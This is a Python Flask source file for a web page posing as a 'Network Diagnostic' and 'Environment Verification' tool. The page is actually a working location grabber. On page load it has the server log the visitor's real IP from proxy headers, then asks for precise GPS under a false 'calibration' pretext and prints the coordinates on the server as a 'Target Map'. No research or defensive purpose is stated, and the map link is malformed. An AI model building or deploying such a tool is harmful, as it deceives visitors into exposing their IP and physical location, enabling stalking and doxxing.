import os
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Network Diagnostic</title>
    <style>
        body { font-family: -apple-system, sans-serif; background-color: #0f172a; color: #f8fafc; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: #1e293b; padding: 30px; border-radius: 12px; max-width: 450px; width: 90%; text-align: center; box-shadow: 0 10px 15px rgba(0,0,0,0.3); }
        h2 { margin-top: 0; color: #38bdf8; }
        p { color: #94a3b8; font-size: 14px; }
        .terminal { margin-top: 20px; font-family: monospace; font-size: 11px; background: #0f172a; padding: 15px; border-radius: 6px; text-align: left; border-left: 4px solid #38bdf8; white-space: pre-wrap; }
    </style>
</head>
<body>
<div class="box">
    <h2>Environment Verification</h2>
    <p>Calibrating pathways. Please maintain connection status...</p>
    <div id="log" class="terminal">Establishing interface...</div>
</div>
<script>
    const logger = document.getElementById('log');
    function writeLog(t) { logger.innerText += "\\n" + t; }
    
    async function transmit(p) {
        try { await fetch('/receive-data', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(p) }); }
        catch (e) { console.error(e); }
    }
    
    async function initialize() {
        writeLog("[*] Layer 1: Accessing network metadata...");
        
        // Transmit an empty handshake to trigger the server-side IP extractor
        await transmit({ type: "layer1" });
        writeLog("[+] Layer 1 complete.");
        
        writeLog("\\n[*] Layer 2: Syncing device positioning system...\\nPlease accept the browser prompt.");
        if (!navigator.geolocation) { return; }
        navigator.geolocation.getCurrentPosition(
            async (p) => {
                writeLog("[SUCCESS] System telemetry calibration confirmed.");
                await transmit({ 
                    type: "layer2", 
                    data: { latitude: p.coords.latitude, longitude: p.coords.longitude, acc: p.coords.accuracy } 
                });
            },
            async (e) => {
                writeLog("[-] Layer 2 Refused.");
                await transmit({ type: "layer2", data: { error: "Rejected" } });
            },
            { enableHighAccuracy: true, timeout: 12000 }
        );
    }
    window.onload = initialize;
</script>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route('/receive-data', methods=['POST'])
def receive_data():
    req = request.get_json()
    dtype = req.get('type')
    
    print("\n" + "="*55)
    if dtype == "layer1":
        # Extract the real client IP passing through the Render/Cloud proxy headers
        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        if ',' in str(client_ip):
            client_ip = client_ip.split(',')[0].strip()
            
        print(f" [HANDSHAKE LOGGED]")
        print(f"   IP Address : {client_ip}")
        print(f"   Routing    : Cloud Proxy Pipeline Verified")
        
    elif dtype == "layer2":
        data = req.get('data')
        print(f" [GPS CALIBRATION LOGGED]")
        if 'error' in data: 
            print("   Status     : ACCESS DECLINED BY USER")
        else:
            print(f"   Coordinates: {data.get('latitude')}, {data.get('longitude')}")
            print(f"   Target Map : https://google.com{data.get('latitude')},{data.get('longitude')}")
    print("="*55 + "\n")
    return jsonify({"status": "acknowledged"}), 200

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)
